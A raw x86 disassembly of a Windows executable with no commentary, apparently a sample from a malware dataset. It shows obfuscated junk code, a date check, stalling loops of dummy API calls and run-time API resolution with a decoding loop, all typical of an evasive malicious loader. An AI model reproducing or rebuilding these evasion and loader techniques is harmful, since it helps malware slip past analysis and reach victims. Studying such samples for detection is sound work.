cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ ebp + 0x50 ]
sbb al 0x1c
sbb al 0xb5
loopne r-xdata
sbb al 0x73
jae r-xdata
mov [ 0x60e3e3e0 ] eax
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and ah ch
movaps xmm3 [ si ]
sbb al 0x68
sub ecx [ edx ]
inc esi
sbb [ esp + ebx ] bl
fisub [ edi + 0x61ecfbc7 ]
rcl [ eax ] 0x1
sbb al 0x1c
in al dx
push esp
sub bl [ cs : esp + ebx ]
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
sub ah [ eax ]
jae r-xdata
sbb al 0x1c
in al dx
pop ss
or ah [ edx ]
adc ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
add eax 0x73731c1c
jae r-xdata
pop ss
mov bl 0x89
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop es
push 0x54c30b24
mov ebx esp
sbb al 0x74
dec edi
jecxz r-xdata
push esp
pushad
sbb al 0x1c
jae r-xdata
sbb al 0xda
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
mov ch 0xb3
mov ah 0x1c
and esp [ ebx + 0x1c506d0a ]
and esi [ ebx + 0x751ce389 ]
arpl bx sp
jecxz r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
out 0x6a eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp ebx
jae r-xdata
scasb [ edi ]
int1
push 0xbe6a853c
cmpsd [ esi ] [ edi ]
mov [ ecx - 0x41957a48 ] edx
push 0x3eb50a0f
sbb al 0x1c
test [ edx - 0x42 ] ebp
in eax dx
push 0xbe6a853b
sar [ eax ] 0x1
test [ edx - 0x42 ] ebp
mov bl 0xa
jae r-xdata
sbb esp edx
or dl [ edi ]
jne r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
mov ah 0x6a
daa
jae r-xdata
push esp
daa
sti
and cx [ edx ]
arpl [ ebp + 0x1c ] bx
dec edi
push 0xec1c661b
scasb [ edi ]
sub ebp [ esi - 0x5a ]
dec ebx
or ecx [ ebp + 0x18 ]
sbb al 0x1c
and bp sp
pop ebx
and [ esp + ebx ] ebx
outsb
scasb [ edi ]
pop ebx
outsb
cmpsb [ esi ] [ edi ]
dec ebx
or edi [ eax + 0x18 ]
sbb al 0x1c
and bp sp
sbb al 0x6e
rol [ ebp - 0x44f45996 ] 0x1
or ch al
xor eax 0x73731c1c
jae r-xdata
jae r-xdata
pushad
shl ebx cl
sti
cmp eax 0x73731c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
sbb al 0xec
and [ ebx + 0x73 ] dh
jae r-xdata
fdivr [ esp + ebx ]
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
mov edx 0xaa323d0
push es
jecxz r-xdata
cmp al 0x1c
sbb al 0x68
sbb esp eax
sbb [ edx ] cl
jg r-xdata
inc [ ebp + 0x67ec2366 ]
movsb [ edi ] [ esi ]
jae r-xdata
mov bl 0x1c
jne r-xdata
jecxz r-xdata
pushad

jae r-xdata
sbb al 0x1c
jae r-xdata
mov al [ 0x236685ff ]
jae r-xdata
jne r-xdata
jecxz r-xdata
movsd [ edi ] [ esi ]
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x89
cmp al 0x1c
jae r-xdata
jecxz r-xdata
daa
mov [ 0xffffffff80831d8b ] eax
push cs
mov ah 0x6a
movsd [ edi ] [ esi ]
xor [ ecx ] esp
push 0xffffffa6
pop ebp
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
movsb [ di ] [ si ]
test [ esi + 0x23 ] esp
add eax 0x3ae6a85
mov edx 0xb30ba66e
test [ edx - 0x5a ] ebp
push 0x6a85eba6
scasb [ edi ]
add [ edx ] ecx
inc [ esp + ebx ]
sbb al 0xb
bound ebp [ eax ]
sbb al 0x1c
mov edx 0xa2568ba
or al 0x52
sbb al 0x1c
jae r-xdata
push 0xffffffae
add edi [ edx - 0x4cf45992 ]
sbb esp [ esi + 0x1c ]
in al dx
or edx [ ecx + 0x38 ]
sbb al 0x1c
mov esi [ eax + esi * 8 - 0x3e ]
pop ebp
mov ah 0x6a
movsd [ edi ] [ esi ]
jmp r-xdata
daa
jecxz r-xdata
mov edx [ ebx + 0x5d ]
test al 0x6f
sbb al 0x54
pushad
daa
jae r-xdata
or edi ecx
and bl [ esp + ebx ]
or dl ch
push ds
and ebp esp
mov ebx eax
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] bl
mov ebx [ ebx ]
das
fsubr [ edx - 0x185a954c ]
or esi [ ebp + 0x38 ]
or esp [ esi + 0x38 ]
sbb al 0x1c
std
mov ah 0x6a
movsd [ edi ] [ esi ]
sti
or ebp [ 0xffffffff8b1c1c38 ]
out dx eax
dec esp
and [ edx - 0x4c ] dl
push 0xffffffa5
dec [ ebx ]
and edi [ eax ]
sbb al 0x1c
mov ebp [ esi ]
loope r-xdata
cwde
jae r-xdata
pushad
dec edx
cmp ebx [ esp + ebx ]
jae r-xdata
movsd [ edi ] [ esi ]
out 0xb eax
jne r-xdata
sti
or ch [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb5
jae r-xdata
retn
jae r-xdata
inc edi
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xb4
or al dl
push es
jae r-xdata
and ecx esp
or cl [ edx + 0x731c1c19 ]
jae r-xdata
sbb al 0x1c
mov eax [ ebx - 0x4b2abb9c ]
push 0x65
push ebx
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sub ch ah
jecxz r-xdata
mov ch 0x6e
jae r-xdata
mov bh 0x18
sbb al 0x1c
mov bl 0xb5
or dh dh
or ebx [ esp + ebx ]
jae r-xdata
mov ch 0xb5
jae r-xdata
sbb al 0x1c
jae r-xdata
cmp esp [ edi ]
push 0x65
push edi
jecxz r-xdata
cmp [ esp + ebx ] bl
mov ecx edx
test [ edx - 0x5a ] ebp
or edi [ ebx + 0x1c35e80a ]
sbb al 0x73
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push ebx
imul esp [ esi + 0x3a66b13 ] 0x6b
cmpsb [ esi ] [ edi ]
xor ebp [ ebx - 0x5a ]
and ebp [ esi - 0x52 ]
pop es
outsb
cmpsb [ esi ] [ edi ]
inc edi
and al 0xa6
pop es
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
or esi [ ebp + 0x24b5a8ae ]
cmpsb [ esi ] [ edi ]
xrstor [ eax - 0x59db514b ]
aaa
scasb [ edi ]
mov al [ eax + 0x3ba62491 ]
mov [ eax + 0x2f0a858c ] ss
and eax 0x73731c1c
jae r-xdata
xor al 0x1c
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ ebx ] 0x1c1c383f
mov esp [ edi - 0x68 ]
sbb eax 0xb40e8083
push 0xffffffa5
pushad
test [ eax - 0x27 ] esp
jecxz r-xdata
jecxz r-xdata
in al 0xe3
jae r-xdata
pop ecx
sbb al 0x1c
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
arpl [ esi ] bx
sbb al 0x1c
or bh [ edi + 0x22 ]
sbb al 0x1c
and cx [ edx ]
or dl [ ecx + 0x6 ]
jae r-xdata
and ebp esp
jmp r-xdata
xor eax 0x731c1c38
jae r-xdata
daa
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
sbb esp eax
scasb [ edi ]
mov dh 0x68
lss ecx [ edx ]
dec ecx
add ebx [ esp + ebx ]
jae r-xdata
aaa
xchg edi eax
test [ edx - 0x52 ] ebp
jae r-xdata
mov edx 0x160a9b89
xor eax 0x73731c1c
jae r-xdata
mov esi 0xf50bb42b
or bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
push es
jae r-xdata
mov ch 0xa
test [ ebx ] 0x1c
sbb al 0x73
jae r-xdata
sbb al 0x1c
or dl dh
cmp [ esp + ebx ] ebx
outsb
test [ ecx ] esi
push 0x961cd7a5
test [ ecx ] si
jae r-xdata
jae r-xdata
jae r-xdata
lodsb [ esi ]
out dx eax
sub ch ah
jmp r-xdata
sbb al 0x1c
jae r-xdata
push 0xffffffae
mov esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
or bl al
add ebx [ esp + ebx ]
sbb al 0x73
jae r-xdata
and bp sp
pushad
retn
and ecx [ edx ]
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
xor ebp [ esi - 0x5a ]
xor esi [ ebx + 0x1c51fe0a ]
sbb al 0x73
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
sbb eax 0x8a0a1c1c
sbb eax 0x5b731c1c
popfd
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
pop ebx
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push 0xbe6a853d
jmp 0xffffffff93509dfc
in al dx
push esp
movsd [ edi ] [ esi ]
in eax 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
sar [ ebx ] cl
sbb al 0x1c
jae r-xdata
or ecx [ 0x1c1c1c26 ]
popfd
call [ edx + 0x1c ]
xchg edi eax
or eax 0x1c1c1c26
jae r-xdata
push 0xffffffbe
sub esi [ ebx + ecx + 0x1c1c0af5 ]
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ 0x731c1c59 ]
jae r-xdata
sbb al 0xba
push 0x2a66efac
in al dx
and eax 0x1c52ff0b
mov esp ebx
shl ebx cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
aad 0x1e
jg r-xdata
xlat
mov al 0xb0
outsb
sbb al 0x96
push 0x961ceba6
or bl al
mov ebx esp
push 0x65
aas
jecxz r-xdata
sbb al 0x97
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
mov ah 0x6e
scasb [ edi ]
pop ds
or dh al
pop es
push 0x2a270a0f
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0x6e
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x7751cb0 ]
jecxz r-xdata
mov al 0xb0
mov al 0x6e
jae r-xdata
test [ ebp + 0xaa5a0da ] 0x1c1c59d0
xor esp esp
jae r-xdata
mov dh 0x1f
or ah [ esi ]
push cs
sbb al 0x1c
jae r-xdata
push 0x52ff0b25
sbb al 0x1c
jae r-xdata
jae r-xdata
mov edx 0x66efac68
sub ch ah
in eax 0xb
jae r-xdata
mov ecx [ eax - 0x4f2cac4b ]
pop ds
sbb al 0x1c
or bl [ edx + 0x731c1c1f ]
or ebx [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0xa
fadd [ ebx ]
sbb al 0x1c
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
jae r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov esp ebp
pop ebp
dec eax
jae r-xdata
mov edx [ edx - 0x4f2cac4b ]
push 0xffffffe5
sbb al 0xa
jae r-xdata
sbb al 0x1c
jae r-xdata
mov [ rw-data ] 0x40c4
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jmp r-xdata
sbb al 0x1c
jae r-xdata
0x731c1c1f 0x5b0b
jae r-xdata
mov dh 0x68
mov [ rw-data ] 0x174
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665e4
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
inc [ rw-data ]
cmp [ rw-data ] 0x152f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov ch 0x53
jae r-xdata
cmp ebx [ esp + ebx ]
pop ebx
jae r-xdata
jae r-xdata
mov [ rw-data ] 0x1774
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
mov [ rw-data ] 0x1
jmp r-xdata
retn 0x4
in eax 0x5d
shl [ eax + 0x1c4d1a0a ] cl
jae r-xdata
mov edx 0xaa323d0
cmp eax 0x731c1c24
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8cea
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
nop
nop
mov eax 0x1c750735
call sub_4026bc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
or bl [ edx ]
jae r-xdata
or ecx [ eax + 0x3b ]
jae r-xdata
mov [ rw-data ] 0x1
dec ebp
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
mov ecx 0x73
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sbb al 0x73
jae r-xdata
pop ss
loopne r-xdata
push 0xaee01baa
sbb al 0x8b
jae r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ ebp + 0xab0d353 ] dh
jae r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1c74f007
jne r-xdata
call sub_403198
push ebx
jae r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x1
sbb cl [ ebp + 0x1c ]
mov al 0xa
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8e8b
jne r-xdata
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jae r-xdata
push 0x1f
call sub_4060e8
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_460e24
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0xc
jbe r-xdata
nop
push 0x0
call sub_460eac
nop
nop
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
stosb [ edi ]
sub_46664f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46666f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466676
retn
sub_466678
inc eax
add [ eax ] al
add [ eax - 0x43ffb99a ] al
pop ebp
inc eax
add [ ebp + ebx * 2 + 0x5bb00040 ] cl
inc eax
add [ ebx + ebx * 2 + 0x40 ] bl
add [ esi + ebx * 2 ] dh
inc eax
add [ esi + ebx * 2 ] al
inc eax
add [ edx + ebp * 2 + 0x6a8c0040 ] bh
inc eax
add ah dh
push 0x40
add ah al
push 0x40
add ah bh
or al 0x41
add ah cl
or al 0x41
add [ esi + ebp * 2 ] al
inc eax
add ah dl
insd
inc eax
add [ ecx + edx * 8 ] al
inc eax
add [ edi + ecx * 8 - 0x268fffc0 ] al
inc eax
add [ eax - 0x27 ] al
inc eax
add [ eax ] bl
add eax [ ecx ]
mov al [ 0xffffffffdc004102 ]
add al 0x41
add [ esp + eax + 0xcc40041 ] ch
inc ecx
add [ esp + ecx + 0x41 ] dh
add [ eax ] bh
movsb [ edi ] [ esi ]
inc ecx
add [ eax + 0x440041a3 ] cl
pop ds
inc edx
add [ edi + ebx ] dl
inc edx
add ah bh
and [ edx ] eax
int3
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_466678
call sub_405d48
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4583c8
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_4583e0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458460
call sub_403ea0
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4056a0
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4056b4
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_403994
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_403994
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_403994
sub_40240a
jmp sub_403994
sub_4026a9
jmp sub_403994
sub_40276c
call sub_405cfc
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405cfc
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403f78
sub_402824
push eax
push edx
push ecx
call sub_405cfc
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405cfc
mov ebx [ eax + 0x4 ]
call sub_405cfc
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a44
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a54
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402af0
mov edx [ eax + 0x1c ]
call sub_402aa8
retn
sub_402d58
mov ecx 0xff
call sub_402d64
retn
sub_402d88
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402da4
jmp sub_402da4
sub_402da1
retn
sub_403131
jmp sub_403994
sub_403184
fninit
fwait
fldcw [ rw-data ]
retn
sub_403190
mov al 0x4
jmp sub_402818
sub_4031e4
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031f0
push ebx
mov ebx eax
mov eax ebx
call sub_403220
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403264
pop ebx
retn
sub_40320c
push ebx
mov ebx eax
mov eax ebx
call sub_4032bc
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_403220
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403248
call sub_4035cc
test dl dl
jle r-xdata
retn
call sub_4035b4
sub_403308
retn
sub_403390
jmp sub_403994
sub_403397
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403488
mov eax 0x8000ffff
retn
sub_403490
retn
sub_403494
retn
sub_403498
retn
sub_40358d
jmp sub_4036e0
sub_403592
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_4039f4
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035b4
sub_4035b4
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035bc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035cc
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035dc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036a4
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036c0
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403a8d
retn
sub_403bd0
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c5e
jmp sub_4036e0
sub_403cbe
jmp sub_4036e0
sub_403cd8
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bd0
mov [ rw-data ] 0x0
call sub_403c78
retn
sub_403e11
retn
sub_403f73
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f78
mov [ rw-data ] eax
call sub_403ea0
sub_4041b4
retn
sub_4041f0
retn
sub_4041fe
retn
sub_404217
retn
sub_404228
retn
sub_40430f
retn
sub_404440
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_40445c#2
jmp sub_40445c
sub_4044a5
retn
j_sub_40445c
jmp sub_40445c
sub_4044ad
retn
sub_4044ef
retn
sub_404648
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_404660
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4047b8
retn
sub_4047ca
retn
sub_4047cc
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049f4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404af8
mov ecx 0x1
jmp sub_404a0c
sub_404b02
retn
sub_404b04
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404d2a
retn
sub_404d2c
mov al 0x11
jmp sub_402818
sub_404d57
retn
sub_404d68
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c38
pop ebp
retn 0x4
j_sub_404a0c
jmp sub_404a0c
sub_404d7d
retn
sub_404d80
call sub_404f20
retn
sub_404fac
call sub_404f84
retn
sub_4052f5
jmp sub_403994
sub_405460
call sub_405470
retn
sub_405468
call sub_405490
retn
sub_405470
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40552b
jmp sub_4036e0
sub_40554c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4055c0
jmp sub_403994
sub_4055c7
pop ecx
pop ebp
retn
sub_405640
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_40564c
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405658
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_405668
call sub_4031f0
mov [ eax + 0x4 ] 0x1
retn
sub_4056a0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_40598f
jmp sub_403994
sub_405996
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a33
jmp sub_403994
sub_405a3a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a83
jmp sub_403994
sub_405a8a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405b4e
jmp sub_403994
sub_405b55
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405ba6
jmp sub_403994
sub_405bad
pop ebp
retn
sub_405c84
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405ca4
push eax
push 0x40
call LocalAlloc
retn
sub_405cb0
mov eax 0x10
retn
sub_405d3c
mov eax rw-data
call sub_40554c
retn
sub_405db1
jmp sub_403994
sub_405db8
pop ebp
retn
sub_405dbc
sub [ rw-data ] 0x1
retn
sub_405dc4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405de0
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405e29
jmp sub_403994
sub_405e30
pop ebp
retn
sub_405e34
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcess
jmp [ GetCurrentProcess@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ GlobalLock@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ GlobalUnlock@IAT ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ LoadLibraryA@IAT ]
LoadResource
